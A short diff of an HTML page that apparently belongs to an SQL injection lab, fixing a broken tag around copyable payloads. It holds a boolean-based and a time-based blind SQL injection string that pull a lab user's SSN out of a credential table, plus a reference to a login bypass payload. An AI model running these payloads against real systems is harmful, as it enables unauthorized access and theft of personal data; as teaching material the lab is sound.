@@ -36,7 +36,7 @@
     <button onclick="copyToClipboard('inband-bypass')">Copy Login Bypass Payload</button>
 
     <h2>3. Malicious Payloads for Blind SQLi (Alice's SSN: 10211002)</h2>
-    <pre id="blind-boolean"admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name=‘Alice'),1,1)=‘1' --  </pre>
+    <pre id="blind-boolean">admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name=‘Alice'),1,1)=‘1' --  </pre>
     <button onclick="copyToClipboard('blind-boolean')">Copy Boolean-based Payload</button>
 
     <pre id="blind-time">admin' AND IF(SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='1', SLEEP(3), 0)=0 -- </pre>
